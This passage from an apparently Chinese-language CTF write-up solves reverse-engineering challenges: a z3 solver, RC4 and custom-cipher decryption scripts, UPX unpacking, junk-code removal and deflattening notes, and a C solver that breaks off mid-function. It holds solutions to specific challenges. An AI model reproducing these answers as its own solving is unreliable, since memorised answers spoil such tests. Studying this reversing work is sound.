          flag[27] + 29 * flag[28] + 6 * flag[29] + 97 * flag[30] + 25 * flag[31] + 10 * flag[32] + 18 * flag[33] + 23 *
          flag[34] + 30 * flag[35] == 154052)
    s.add(97 * flag[0] + 93 * flag[1] + 10 * flag[2] + 44 * flag[3] + 28 * flag[4] + 22 * flag[5] + 17 * flag[6] + 41 *
          flag[7] + 47 * flag[8] + 62 * flag[9] + 42 * flag[10] + 47 * flag[11] + 61 * flag[12] + 32 * flag[13] + 31 *
          flag[14] + 52 * flag[15] + 47 * flag[16] + 92 * flag[17] + 42 * flag[18] + 37 * flag[19] + 7 * flag[20] + 40 *
          flag[21] + 48 * flag[22] + 40 * flag[23] + 11 * flag[24] + 96 * flag[25] + 51 * flag[26] + 42 * flag[
              27] + 66 * flag[28] + 8 * flag[29] + 89 * flag[30] + 64 * flag[31] + 30 * flag[32] + 11 * flag[33] + 8 *
          flag[34] + 83 * flag[35] == 147899)
    s.add(51 * flag[0] + 94 * flag[1] + 58 * flag[2] + 76 * flag[3] + 21 * flag[4] + 10 * flag[5] + 75 * flag[6] + 4 *
          flag[7] + 55 * flag[8] + 37 * flag[9] + 71 * flag[10] + 97 * flag[11] + 27 * flag[12] + 93 * flag[13] + 82 *
          flag[14] + 94 * flag[15] + 38 * flag[16] + 69 * flag[17] + 36 * flag[18] + 58 * flag[19] + 93 * flag[
              20] + 18 * flag[21] + 54 * flag[22] + 59 * flag[23] + 12 * flag[24] + 12 * flag[25] + 54 * flag[26] + 83 *
          flag[27] + 73 * flag[28] + 83 * flag[29] + 33 * flag[30] + 12 * flag[31] + 78 * flag[32] + 38 * flag[
              33] + 45 * flag[34] + 57 * flag[35] == 176754)
    s.add(78 * flag[0] + 29 * flag[1] + 8 * flag[2] + 47 * flag[3] + 48 * flag[4] + 88 * flag[5] + 18 * flag[6] + 88 *
          flag[7] + 50 * flag[8] + 58 * flag[9] + 36 * flag[10] + 88 * flag[11] + 9 * flag[12] + 74 * flag[13] + 85 *
          flag[14] + 5 * flag[15] + 91 * flag[16] + 58 * flag[17] + 85 * flag[18] + 46 * flag[19] + 89 * flag[20] + 76 *
          flag[21] + 61 * flag[22] + 6 * flag[23] + 61 * flag[24] + 78 * flag[25] + 4 * flag[26] + 48 * flag[27] + 50 *
          flag[28] + 69 * flag[29] + 23 * flag[30] + 70 * flag[31] + 23 * flag[32] + 15 * flag[33] + 22 * flag[
              34] + 68 * flag[35] == 171970)
    s.add(75 * flag[0] + 2 * flag[1] + 94 * flag[2] + 97 * flag[3] + 72 * flag[4] + 62 * flag[5] + 78 * flag[6] + 42 *
          flag[7] + 69 * flag[8] + 11 * flag[9] + 37 * flag[10] + 3 * flag[11] + 29 * flag[12] + 15 * flag[13] + 39 *
          flag[14] + 33 * flag[15] + 18 * flag[16] + 33 * flag[17] + 12 * flag[18] + 64 * flag[19] + 6 * flag[20] + 18 *
          flag[21] + 34 * flag[22] + 15 * flag[23] + 3 * flag[24] + 100 * flag[25] + 85 * flag[26] + 32 * flag[
              27] + 97 * flag[28] + 93 * flag[29] + 84 * flag[30] + 73 * flag[31] + 26 * flag[32] + 31 * flag[33] + 71 *
          flag[34] + 97 * flag[35] == 166497)
    s.add(59 * flag[0] + 26 * flag[1] + 48 * flag[2] + 86 * flag[3] + 58 * flag[4] + 70 * flag[5] + 61 * flag[6] + 100 *
          flag[7] + 63 * flag[8] + 74 * flag[9] + 26 * flag[10] + 38 * flag[11] + 24 * flag[12] + 45 * flag[13] + 52 *
          flag[14] + 32 * flag[15] + 91 * flag[16] + 89 * flag[17] + 19 * flag[18] + 59 * flag[19] + 87 * flag[20] + 5 *
          flag[21] + 15 * flag[22] + 68 * flag[23] + 72 * flag[24] + 67 * flag[25] + 2 * flag[26] + 65 * flag[27] + 46 *
          flag[28] + 10 * flag[29] + 33 * flag[30] + 79 * flag[31] + 11 * flag[32] + 16 * flag[33] + 73 * flag[
              34] + 53 * flag[35] == 173887)
    s.add(6 * flag[0] + 66 * flag[1] + 59 * flag[2] + 76 * flag[3] + 86 * flag[4] + 20 * flag[5] + 59 * flag[6] + 34 *
          flag[7] + 28 * flag[8] + 48 * flag[9] + 86 * flag[10] + 5 * flag[11] + 87 * flag[12] + 13 * flag[13] + 95 *
          flag[14] + 87 * flag[15] + 65 * flag[16] + 35 * flag[17] + 58 * flag[18] + 10 * flag[19] + 98 * flag[
              20] + 100 * flag[21] + 4 * flag[22] + 78 * flag[23] + 66 * flag[24] + 57 * flag[25] + 34 * flag[26] + 86 *
          flag[27] + 62 * flag[28] + 36 * flag[29] + 92 * flag[30] + 28 * flag[31] + 3 * flag[32] + 24 * flag[33] + 49 *
          flag[34] + 28 * flag[35] == 173189)
    s.add(25 * flag[0] + 48 * flag[1] + 44 * flag[2] + 16 * flag[3] + 99 * flag[4] + 100 * flag[5] + 69 * flag[6] + 26 *
          flag[7] + 65 * flag[8] + 32 * flag[9] + 18 * flag[10] + 65 * flag[11] + 58 * flag[12] + 72 * flag[13] + 61 *
          flag[14] + 56 * flag[15] + 10 * flag[16] + 78 * flag[17] + 93 * flag[18] + 98 * flag[19] + 39 * flag[
              20] + 43 * flag[21] + 87 * flag[22] + 12 * flag[23] + 42 * flag[24] + 100 * flag[25] + 100 * flag[
              26] + 47 * flag[27] + 31 * flag[28] + 51 * flag[29] + 75 * flag[30] + 10 * flag[31] + 63 * flag[32] + 48 *
          flag[33] + 22 * flag[34] + 87 * flag[35] == 174138)
    s.add(61 * flag[0] + 13 * flag[1] + 100 * flag[2] + 59 * flag[3] + 31 * flag[4] + 9 * flag[5] + 28 * flag[6] + 7 *
          flag[7] + 27 * flag[8] + 63 * flag[9] + 11 * flag[10] + 57 * flag[11] + 95 * flag[12] + 79 * flag[13] + 21 *
          flag[14] + 30 * flag[15] + 60 * flag[16] + 81 * flag[17] + 43 * flag[18] + 32 * flag[19] + 30 * flag[
              20] + 34 * flag[21] + 80 * flag[22] + 53 * flag[23] + 28 * flag[24] + 39 * flag[25] + 74 * flag[26] + 21 *
          flag[27] + 18 * flag[28] + 92 * flag[29] + 73 * flag[30] + 60 * flag[31] + 21 * flag[32] + 69 * flag[
              33] + 76 * flag[34] + 84 * flag[35] == 157623)
    s.add(22 * flag[0] + 62 * flag[1] + 61 * flag[2] + 20 * flag[3] + 66 * flag[4] + 2 * flag[5] + 11 * flag[6] + 82 *
          flag[7] + 93 * flag[8] + 13 * flag[9] + 69 * flag[10] + 37 * flag[11] + 92 * flag[12] + 80 * flag[13] + 66 *
          flag[14] + 47 * flag[15] + 28 * flag[16] + 14 * flag[17] + 62 * flag[18] + 56 * flag[19] + 89 * flag[
              20] + 29 * flag[21] + 39 * flag[22] + 38 * flag[23] + 46 * flag[24] + 10 * flag[25] + 6 * flag[26] + 82 *
          flag[27] + 77 * flag[28] + 78 * flag[29] + 45 * flag[30] + 50 * flag[31] + 5 * flag[32] + 73 * flag[33] + 17 *
          flag[34] + 65 * flag[35] == 154943)
    s.add(5 * flag[0] + 84 * flag[1] + 83 * flag[2] + 77 * flag[3] + 76 * flag[4] + 60 * flag[5] + 20 * flag[6] + 48 *
          flag[7] + 53 * flag[8] + 14 * flag[9] + 98 * flag[10] + 50 * flag[11] + 37 * flag[12] + 15 * flag[13] + 31 *
          flag[14] + 69 * flag[15] + 55 * flag[16] + 37 * flag[17] + 64 * flag[18] + 35 * flag[19] + 26 * flag[
              20] + 20 * flag[21] + 18 * flag[22] + 67 * flag[23] + 50 * flag[24] + 57 * flag[25] + 60 * flag[26] + 71 *
          flag[27] + 4 * flag[28] + 35 * flag[29] + 23 * flag[30] + 52 * flag[31] + 11 * flag[32] + 15 * flag[33] + 83 *
          flag[34] + 51 * flag[35] == 156078)
    s.add(33 * flag[0] + 47 * flag[1] + 89 * flag[2] + 52 * flag[3] + 89 * flag[4] + 55 * flag[5] + 98 * flag[6] + 28 *
          flag[7] + 48 * flag[8] + 90 * flag[9] + 69 * flag[10] + 29 * flag[11] + 68 * flag[12] + 24 * flag[13] + 19 *
          flag[14] + 18 * flag[15] + 44 * flag[16] + 27 * flag[17] + 14 * flag[18] + 64 * flag[19] + 15 * flag[
              20] + 31 * flag[21] + 23 * flag[22] + 2 * flag[23] + 36 * flag[24] + 45 * flag[25] + 37 * flag[26] + 71 *
          flag[27] + 61 * flag[28] + 92 * flag[29] + 28 * flag[30] + 64 * flag[31] + 13 * flag[32] + 66 * flag[
              33] + 98 * flag[34] + 3 * flag[35] == 156158)
    s.add(80 * flag[0] + 88 * flag[1] + 68 * flag[2] + 66 * flag[3] + 46 * flag[4] + 75 * flag[5] + 32 * flag[6] + 19 *
          flag[7] + 36 * flag[8] + 83 * flag[9] + 63 * flag[10] + 86 * flag[11] + 79 * flag[12] + 30 * flag[13] + 61 *
          flag[14] + 50 * flag[15] + 100 * flag[16] + 52 * flag[17] + 66 * flag[18] + 30 * flag[19] + 20 * flag[
              20] + 97 * flag[21] + 45 * flag[22] + 46 * flag[23] + 38 * flag[24] + 21 * flag[25] + 32 * flag[26] + 79 *
          flag[27] + 68 * flag[28] + 43 * flag[29] + 65 * flag[30] + 47 * flag[31] + 86 * flag[32] + 30 * flag[
              33] + 74 * flag[34] + 18 * flag[35] == 181770)
    s.add(11 * flag[0] + 58 * flag[1] + 95 * flag[2] + 67 * flag[3] + 96 * flag[4] + 74 * flag[5] + 60 * flag[6] + 11 *
          flag[7] + 21 * flag[8] + 14 * flag[9] + 100 * flag[10] + 60 * flag[11] + 70 * flag[12] + 92 * flag[13] + 92 *
          flag[14] + 39 * flag[15] + 43 * flag[16] + 52 * flag[17] + 5 * flag[18] + 22 * flag[19] + 90 * flag[20] + 70 *
          flag[21] + 12 * flag[22] + 52 * flag[23] + 36 * flag[24] + 21 * flag[25] + 45 * flag[26] + 59 * flag[
              27] + 74 * flag[28] + 46 * flag[29] + 11 * flag[30] + 60 * flag[31] + 8 * flag[32] + 52 * flag[33] + 14 *
          flag[34] + 77 * flag[35] == 173577)
    s.add(57 * flag[0] + 37 * flag[1] + 94 * flag[2] + 43 * flag[3] + 53 * flag[4] + 55 * flag[5] + 7 * flag[6] + 83 *
          flag[7] + 91 * flag[8] + 61 * flag[9] + 86 * flag[10] + 6 * flag[11] + 44 * flag[12] + 87 * flag[13] + 61 *
          flag[14] + 92 * flag[15] + 24 * flag[16] + 74 * flag[17] + 100 * flag[18] + 22 * flag[19] + 12 * flag[
              20] + 68 * flag[21] + 19 * flag[22] + 88 * flag[23] + 81 * flag[24] + 83 * flag[25] + 70 * flag[26] + 39 *
          flag[27] + 30 * flag[28] + 82 * flag[29] + 30 * flag[30] + 35 * flag[31] + 55 * flag[32] + 18 * flag[
              33] + 27 * flag[34] + 80 * flag[35] == 180922)
    s.add(80 * flag[0] + 14 * flag[1] + 5 * flag[2] + 89 * flag[3] + 71 * flag[4] + 82 * flag[5] + 44 * flag[6] + 8 *
          flag[7] + 33 * flag[8] + 26 * flag[9] + 77 * flag[10] + 49 * flag[11] + 36 * flag[12] + 90 * flag[13] + 73 *
          flag[14] + 71 * flag[15] + 66 * flag[16] + 4 * flag[17] + 37 * flag[18] + 78 * flag[19] + 38 * flag[20] + 18 *
          flag[21] + 15 * flag[22] + 79 * flag[23] + 6 * flag[24] + 74 * flag[25] + 18 * flag[26] + 85 * flag[27] + 56 *
          flag[28] + 53 * flag[29] + 90 * flag[30] + 75 * flag[31] + 52 * flag[32] + 2 * flag[33] + 13 * flag[34] + 54 *
          flag[35] == 158596)
    s.add(96 * flag[0] + 29 * flag[1] + 37 * flag[2] + 70 * flag[3] + 92 * flag[4] + 80 * flag[5] + 24 * flag[6] + 36 *
          flag[7] + 32 * flag[8] + 29 * flag[9] + 78 * flag[10] + 45 * flag[11] + 58 * flag[12] + 55 * flag[13] + 16 *
          flag[14] + 92 * flag[15] + 71 * flag[16] + 82 * flag[17] + 86 * flag[18] + 23 * flag[19] + 4 * flag[20] + 58 *
          flag[21] + 16 * flag[22] + 18 * flag[23] + 38 * flag[24] + 53 * flag[25] + 82 * flag[26] + 76 * flag[
              27] + 83 * flag[28] + 73 * flag[29] + 87 * flag[30] + 36 * flag[31] + 61 * flag[32] + 85 * flag[33] + 61 *
          flag[34] + 69 * flag[35] == 181072)
    s.add(14 * flag[0] + 71 * flag[1] + 53 * flag[2] + 46 * flag[3] + 59 * flag[4] + 53 * flag[5] + 22 * flag[6] + 69 *
          flag[7] + 67 * flag[8] + 43 * flag[9] + 23 * flag[10] + 14 * flag[11] + 77 * flag[12] + 95 * flag[13] + 19 *
          flag[14] + 83 * flag[15] + 79 * flag[16] + 41 * flag[17] + 12 * flag[18] + 53 * flag[19] + 3 * flag[20] + 4 *
          flag[21] + 65 * flag[22] + 92 * flag[23] + 64 * flag[24] + 52 * flag[25] + 3 * flag[26] + 59 * flag[27] + 89 *
          flag[28] + 75 * flag[29] + 12 * flag[30] + 46 * flag[31] + 61 * flag[32] + 53 * flag[33] + 97 * flag[
              34] + 43 * flag[35] == 163777)
    s.add(57 * flag[0] + 99 * flag[1] + 49 * flag[2] + 100 * flag[3] + 68 * flag[4] + 99 * flag[5] + 26 * flag[6] + 65 *
          flag[7] + 47 * flag[8] + 65 * flag[9] + 90 * flag[10] + 68 * flag[11] + 84 * flag[12] + 4 * flag[13] + 9 *
          flag[14] + 43 * flag[15] + 88 * flag[16] + 33 * flag[17] + 48 * flag[18] + 88 * flag[19] + 37 * flag[
              20] + 31 * flag[21] + 21 * flag[22] + 94 * flag[23] + 22 * flag[24] + 93 * flag[25] + 70 * flag[26] + 14 *
          flag[27] + 13 * flag[28] + 28 * flag[29] + 83 * flag[30] + 12 * flag[31] + 80 * flag[32] + 58 * flag[
              33] + 43 * flag[34] + 97 * flag[35] == 187620)
    s.add(33 * flag[0] + 94 * flag[1] + 56 * flag[2] + 48 * flag[3] + 13 * flag[4] + 44 * flag[5] + 81 * flag[6] + 42 *
          flag[7] + 19 * flag[8] + 96 * flag[9] + 67 * flag[10] + 79 * flag[11] + 12 * flag[12] + 67 * flag[13] + 34 *
          flag[14] + 72 * flag[15] + 45 * flag[16] + 48 * flag[17] + 24 * flag[18] + 71 * flag[19] + 65 * flag[
              20] + 13 * flag[21] + 32 * flag[22] + 97 * flag[23] + 48 * flag[24] + 42 * flag[25] + 65 * flag[26] + 95 *
          flag[27] + 54 * flag[28] + 9 * flag[29] + 35 * flag[30] + 57 * flag[31] + 18 * flag[32] + 20 * flag[33] + 83 *
          flag[34] + 76 * flag[35] == 169266)
    s.add(31 * flag[0] + 38 * flag[1] + 83 * flag[2] + 45 * flag[3] + 28 * flag[4] + 97 * flag[5] + 54 * flag[6] + 11 *
          flag[7] + 80 * flag[8] + 45 * flag[9] + 92 * flag[10] + 13 * flag[11] + 52 * flag[12] + 94 * flag[13] + 51 *
          flag[14] + 30 * flag[15] + 11 * flag[16] + 61 * flag[17] + 46 * flag[18] + 10 * flag[19] + 28 * flag[
              20] + 72 * flag[21] + 20 * flag[22] + 95 * flag[23] + 90 * flag[24] + 39 * flag[25] + 32 * flag[26] + 95 *
          flag[27] + 19 * flag[28] + 3 * flag[29] + 65 * flag[30] + 71 * flag[31] + 73 * flag[32] + 80 * flag[33] + 23 *
          flag[34] + 71 * flag[35] == 162587)
    s.add(9 * flag[0] + 81 * flag[1] + 80 * flag[2] + 37 * flag[3] + 96 * flag[4] + 72 * flag[5] + 95 * flag[6] + 93 *
          flag[7] + 26 * flag[8] + 98 * flag[9] + 50 * flag[10] + 79 * flag[11] + 57 * flag[12] + 13 * flag[13] + 49 *
          flag[14] + 96 * flag[15] + 82 * flag[16] + 84 * flag[17] + 89 * flag[18] + 40 * flag[19] + 38 * flag[
              20] + 66 * flag[21] + 81 * flag[22] + 81 * flag[23] + 79 * flag[24] + 77 * flag[25] + 86 * flag[26] + 68 *
          flag[27] + 26 * flag[28] + 37 * flag[29] + 15 * flag[30] + 56 * flag[31] + 13 * flag[32] + 17 * flag[
              33] + 50 * flag[34] + 37 * flag[35] == 198705)
    s.add(82 * flag[0] + 57 * flag[1] + 33 * flag[2] + 32 * flag[3] + 79 * flag[4] + 25 * flag[5] + 54 * flag[6] + 27 *
          flag[7] + 50 * flag[8] + 14 * flag[9] + 72 * flag[10] + 31 * flag[11] + 28 * flag[12] + 66 * flag[13] + 4 *
          flag[14] + 6 * flag[15] + 48 * flag[16] + 34 * flag[17] + 63 * flag[18] + 51 * flag[19] + 12 * flag[20] + 21 *
          flag[21] + 73 * flag[22] + 66 * flag[23] + 53 * flag[24] + 38 * flag[25] + 54 * flag[26] + 59 * flag[
              27] + 76 * flag[28] + 63 * flag[29] + 61 * flag[30] + 30 * flag[31] + 84 * flag[32] + 80 * flag[33] + 98 *
          flag[34] + 46 * flag[35] == 160349)
    s.add(69 * flag[0] + 15 * flag[1] + 23 * flag[2] + 8 * flag[3] + 46 * flag[4] + 55 * flag[5] + 21 * flag[6] + 91 *
          flag[7] + 37 * flag[8] + 9 * flag[9] + 61 * flag[10] + 20 * flag[11] + 23 * flag[12] + 96 * flag[13] + 28 *
          flag[14] + 67 * flag[15] + 19 * flag[16] + 50 * flag[17] + 18 * flag[18] + 71 * flag[19] + 30 * flag[
              20] + 14 * flag[21] + 10 * flag[22] + 24 * flag[23] + 100 * flag[24] + 15 * flag[25] + 91 * flag[
              26] + 15 * flag[27] + 93 * flag[28] + 24 * flag[29] + 46 * flag[30] + 61 * flag[31] + 67 * flag[32] + 60 *
          flag[33] + 56 * flag[34] + 81 * flag[35] == 148095)

    # 检查是否有解
    if s.check() == sat:
        model = s.model()
        flag_chars = []
        for i in range(36):
            flag_chars.append(chr(model[flag[i]].as_long()))
        return ''.join(flag_chars)
    else:
        return None


# 解出flag
flag = solve_flag()
if flag:
    print(f"Flag: {flag}")
else:
    print("无法找到解")
```







## [re] 采一朵花，送给ida（2）



额感觉说起来有点乱，挑重点写了

把无意义的call nop掉

然后有提示

```
__int64 rc4_init()
{
  char v1[96]; // [rsp+20h] [rbp-60h] BYREF
  char Source[80]; // [rsp+80h] [rbp+0h] BYREF
  char Destination[38]; // [rsp+D0h] [rbp+50h] BYREF
  __int16 v4; // [rsp+F6h] [rbp+76h]
  _BYTE v5[216]; // [rsp+F8h] [rbp+78h] BYREF
  int v6; // [rsp+1D8h] [rbp+158h]

  v6 = 0;
  strcpy(Destination, "Wow! Why this function looks empty???");
  v4 = 0;
  memset(v5, 0, sizeof(v5));
  strcpy(Source, "Not all kinds of the junk codes will make IDA fail analyze and dispaly JUMPOUT.");
  strcpy(v1, "Try to use TAB to switch to the assembly page and find out what happened to this function.");
  strcat(Destination, Source);
  strcat(Destination, v1);
  return 0LL;
}
```

所以tap直接改jmp了
加密那里差不多改

最终解密脚本

```
def rc4_init(key):
    key_len = len(key)
    S = [i ^ 0xCC for i in range(256)]
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % key_len]) % 256
        S[i], S[j] = S[j], S[i]
    return S


def rc4_generate_keystream(S, length):
    i = 0
    j = 0
    keystream = []
    for _ in range(length):
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        k = S[(S[i] + S[j]) % 256]
        keystream.append(k)
    return keystream


def main():
    cipher_hex = "5c8ae1ef4af03a6756d4654af2afcb0d46e5769053b1d8cfb7338aef799b46fdec0b98204ed28559"
    cipher_bytes = bytearray.fromhex(cipher_hex)

    #改动点
    R = bytearray()
    for i in range(len(cipher_bytes)):
        value = (cipher_bytes[i] - i) % 256
        R.append(value)

    key = b"PickingUpFlowers"

    S = rc4_init(key)

    keystream = rc4_generate_keystream(S, len(R))

    plain_bytes = bytearray()
    for i in range(len(R)):
        plain_byte = R[i] ^ keystream[i]
        plain_bytes.append(plain_byte)

    plaintext = plain_bytes.decode('ascii')
    print("解密后的明文:", plaintext)


if __name__ == '__main__':
    main()
```





## [re] 尤皮·埃克斯历险记（2）

先手脱一下upx，EP下个硬件断点然后找到大跳的地方应该是OEP了

dump下来程序打不开但是做题还是能做

加密那里有个函数进去一看乱的很，查了平坦化

(我的工具太抽象了开始这个平坦化解错了卡了大半天。。)

后面用特殊的手段去平坦化了

然后就是正常解密了

```
import struct
keys = [
    0xD344FC67, 0x2210BDB7, 0x76BB9C00, 0x53F1B5DE, 0x821A977F,
    0xF5B01673, 0x2A406627, 0x935F493C, 0xB98347C1, 0xE1AD274A,
    0xF68B39CE, 0xBCB77109, 0xAE8207AF, 0x54F52F5A, 0x2487ACB7,
    0x2BAA52BD, 0xD7A45B9F, 0xB93D82C7, 0x77FBF041, 0x1747530C,
    0x7EA63DEE, 0x8BAD0343, 0x38822BD3, 0x806B9E9D, 0x242525CF,
    0x1F5D96BE, 0x1ADB4554, 0x47B628D0, 0x77C9A358, 0x3C43D913,
    0x711165D3, 0x1AFDEA6E, 0x57EF6F26, 0x75CDB37E, 0xF08680DE,
    0x7EAAD562, 0x7ABA9243, 0x45AF3320, 0xF7F816B2, 0x3DD5C8D1,
    0x6D8251F6, 0x7606E5D0, 0x38DCED31, 0x7FA1260B, 0xBAEFF202,
    0xD9D85E1D, 0x5E583700, 0x35DFCC5F, 0x1B689ABB, 0x1B2BBB67,
    0xCF506375, 0x3A3D4268, 0x46A5141B, 0x7FE3136C, 0x3E86F672,
    0x8A0B8EEE, 0x33D87CD7, 0xD4A50EA9, 0xC77AFCDD, 0xCDC0D74D,
    0xE0B6F0BC, 0x66C0E9C7, 0xD494B811, 0x9D1D8A81, 0x147C00B6,
    0xDF60C3E4, 0x5FA112F8, 0x7186229A, 0x7FDCDC37, 0x1435FE6B,
    0xF97112A5, 0xEA79306C
]

iv = [0xBE87E8B2, 0x88E9F392, 0x16FB40C3]

target = [
    0xC7, 0xC9, 0x4C, 0x95, 0x6F, 0xBF, 0xC9, 0xF4, 0xC4, 0x86,
    0xA4, 0x20, 0x57, 0x55, 0x6B, 0xE2, 0xEA, 0xDC, 0xB7, 0x3F,
    0x9C, 0x42, 0x1E, 0xE1, 0x72, 0x82, 0x0D, 0x93, 0xB3, 0xF9,
    0xD0, 0x35, 0x93, 0x70, 0xFF, 0x44, 0x72, 0x61, 0x55, 0xF8,
    0xEC, 0xDA, 0xFB, 0x6E, 0xA8, 0xA6, 0xCB, 0x9E
]


def round_func(a1):
    a1 = a1 & 0xFFFFFFFF
    return ((((a1 + 1071031968) ^ 0xFD714A3E) - 2349242794) ^ 0x1756F5FD) - 1917457407


def round_func_inv(y):
    y = y & 0xFFFFFFFF
    return ((((y + 1917457407) ^ 0x1756F5FD) + 2349242794) ^ 0xFD714A3E) - 1071031968


def decrypt():
    count = len(target) // 4
    cipher_words = []

    for i in range(count):
        # 小端序解析
        word = (target[4 * i] |
                (target[4 * i + 1] << 8) |
                (target[4 * i + 2] << 16) |
                (target[4 * i + 3] << 24))
        cipher_words.append(word)

    v14 = (count + 2) // 3  
    intermediate = [0] * count
    for jj in range(v14):
        for kk in range(3):
            idx = 3 * jj + kk
            if idx >= count:
                break
            if jj == 0:
                intermediate[idx] = cipher_words[idx] ^ iv[kk]
            else:
                intermediate[idx] = cipher_words[idx] ^ cipher_words[idx - 3]
    plain_words = [0] * count
    for k in range(v14):
        v8 = [0] * 76
        for m in range(3):
            idx = 3 * k + m
            if idx < count:
                v8[72 + m] = intermediate[idx]
        for n in range(71, -1, -1):
            temp = (v8[n + 2] ^ v8[n + 1]) & 0xFFFFFFFF
            temp = (temp ^ keys[n]) & 0xFFFFFFFF
            T = round_func(temp)
            v8_n_plus_3 = v8[n + 3] & 0xFFFFFFFF
            v8[n] = round_func_inv(v8_n_plus_3) ^ T
            v8[n] = v8[n] & 0xFFFFFFFF
        for m in range(3):
            idx = 3 * k + m
            if idx < count:
                plain_words[idx] = v8[m]
    flag_bytes = bytearray()
    for word in plain_words:
        flag_bytes.append(word & 0xFF)
        flag_bytes.append((word >> 8) & 0xFF)
        flag_bytes.append((word >> 16) & 0xFF)
        flag_bytes.append((word >> 24) & 0xFF)
    flag_bytes = flag_bytes[:48]

    return bytes(flag_bytes)


if __name__ == "__main__":
    flag = decrypt()
    flag_str = flag.decode('ascii')
    print(flag_str)
```





## [re] Dancing_Functions

string Str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&*+-.<=>?@_{|}~";



ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&*+-.<=>?@_{|}~

开始分析

```
Block = KeyGen();
    sub_140001C42(Block, Str1);
    v4 = strcmp(Str1, Str2);
    sub_140003130("The Chemical form of your encrypted message is: ");
```

看了一下，猜测keygen的实现是这个（因为很臭（其实并不是，I_Can_Run_Before_Main我看了，不是debug那里的byte展开了一下下面就是这个，应该没什么问题））（ps：后面发现不是了）

```
_BYTE *sub_1400018D2()
{
  _BYTE *v1; // [rsp+20h] [rbp-10h]
  int v2; // [rsp+28h] [rbp-8h]
  int i; // [rsp+2Ch] [rbp-4h]

  srand(0x11451419u);
  do
  {
    do
      v2 = rand() % 81;
    while ( v2 <= 11 );
  }
  while ( v2 > 16 );
  v1 = malloc(v2 + 1);
  for ( i = 0; i < v2; ++i )
    v1[i] = Str[rand() % 81];
  v1[v2] = 0;
  return v1;
}
```

```
if ( (unsigned int)sub_140001BCD(Str1) )   //简单判断格式
  {
    Block = KeyGen();  //如上加密
    sub_140001C42(Block, Str1);  //应该是关键了
    v4 = strcmp(Str1, Str2);
    sub_140003130("The Chemical form of your encrypted message is: ");
    Dont_Look_At_Me_I_Am_Just_A_Print_Function(Str1);
    if ( v4 )
      sub_140003130("Wrong flag!\n");
    else
      sub_140003130("Right flag!\n");
    free(Block);
  }
```

```
__int64 __fastcall sub_140001C42(const char *a1, const char *a2)
{
  v11 = strlen(a1);
  v10 = strlen(a2);
  sub_140001B15(a2, v10);   //先看下这个吧
```

```
__int64 __fastcall sub_140001B15(__int64 a1, int a2)   //a1是输入  a2是长度
{
  __int64 result; // rax
  int j; // [rsp+24h] [rbp-Ch]
  int v4; // [rsp+28h] [rbp-8h]
  unsigned int i; // [rsp+2Ch] [rbp-4h]

  for ( i = 0; ; ++i )     //等价i=0;i<strlen(str1);++i
  {
    result = i;
    if ( (int)i >= a2 )        
      break;
    v4 = 0;
    for ( j = 0; j < 81; ++j )
    {
    string Str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&*+-.<=>?@_{|}~";
    
      if ( *(unsigned __int8 *)(a1 + (int)i) == Str[j] )
      {
        *(_BYTE *)(a1 + (int)i) = j;
        //这里改了一个值？ 诡异
        v4 = 1;
        break;
      }
    }
    if ( !v4 )
      sub_140002C60(1LL); //退出函数不管
  }
  return result;       
}
```

```
跳回来看
sub_140001C42(Block, Str1);
__int64 __fastcall sub_140001C42(const char *a1, const char *a2)
{
  v11 = strlen(a1);  //哎这说明密钥应该是个字符串
  v10 = strlen(a2);
  sub_140001B15(a2, v10);
  v9 = strlen("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&*+-.<=>?@_{|}~");
  v8 = v9 - 1LL;
  //v9=81  v8=80
  v2 = alloca(sub_140003080());  //没用过不管
  v7 = &v4;
  for ( i = 0; i < v9; ++i )
    v7[i] = 80 - i;
  //v7=[80,79....0]
  v16 = 0;
  for ( j = 0; j < v9; ++j )
  {
    v16 = (v16 + (unsigned __int8)v7[j] + (unsigned __int8)a1[j % v11]) % v9;
    v5 = v7[j];
    v7[j] = v7[v16];
    v7[v16] = v5;
  }
  //奇怪的东西1，感觉是生成了一个盒一样的东西
  
  v14 = 0;
  v13 = 0;
  for ( k = 0; ; ++k )   //等价k < v10（输入字符串长度）
  {
    result = k;
    if ( (int)k >= (int)v10 )
      break;
    v14 = (v13 ^ v14) % v9;
    v13 = (v13 + (unsigned __int8)v7[v14]) % v9;
    
    v6 = v7[v14];
    v7[v14] = v7[v13];
    v7[v13] = v6;
    //swap(v7[13],v7[14])
    
    a2[k] = Str[((unsigned __int8)a2[k] + (unsigned __int8)v7[(unsigned __int8)(v7[v14] ^ v7[v13]) % v9]) % v9];
    //这应该就是加密了，一眼看着感觉是可逆的，毕竟只有这些简单操作
  }
  return result;
}
```

```
这是给的密文
.data:0000000140004000 Str2            db '.sBtQ=0JEhC#sbw=Q-Y*3h-PGpcvZ9SbU+9F5tH96e>-5hMF',0
```

```
key_str = "@m#NpMF0wd9si$"
```

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

const char* Str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&*+-.<=>?@_{|}~";

// 将字符串转换为索引数组（原地修改）
void string_to_index(char* str) {
    int len = strlen(str);
    int str_len = strlen(Str);
    for (int i = 0; i < len; i++) {
        int found = 0;
        for (int j = 0; j < str_len; j++) {
            if (str[i] == Str[j]) {
                str[i] = j; // 替换为索引值
                found = 1;
                break;
            }
        }
        if (!found) {
            printf("Invalid character in string!\n");
            exit(1);
        }
    }
}

// 将索引数组转换为字符串（原地修改）
void index_to_string(char* str, int len) {
    for (int i = 0; i < len; i++) {
        str[i] = Str[(unsigned char)str[i]];
    }
}

// 生成密钥（与加密代码相同）
char* KeyGen() {
    srand(0x11451419);
    int v2;
    do {
        v2 = rand() % 81;
    } while (v2 <= 11 || v2 > 16);
    char* v1 = (char*)malloc(v2 + 1);
    for (int i = 0; i < v2; i++) {
        v1[i] = Str[rand() % 81];
    }
    v1[v2] = 0;
    return v1;
}

// 加密函数（与原始加密代码相同）
void encrypt(const char* key, char* data, int data_len) {
    int key_len = strlen(key);
    int n = strlen(Str); // n=81

    // 初始化v7数组
    unsigned char* v7 = (unsigned char*)malloc(n);
    for (int i = 0; i < n; i++) {
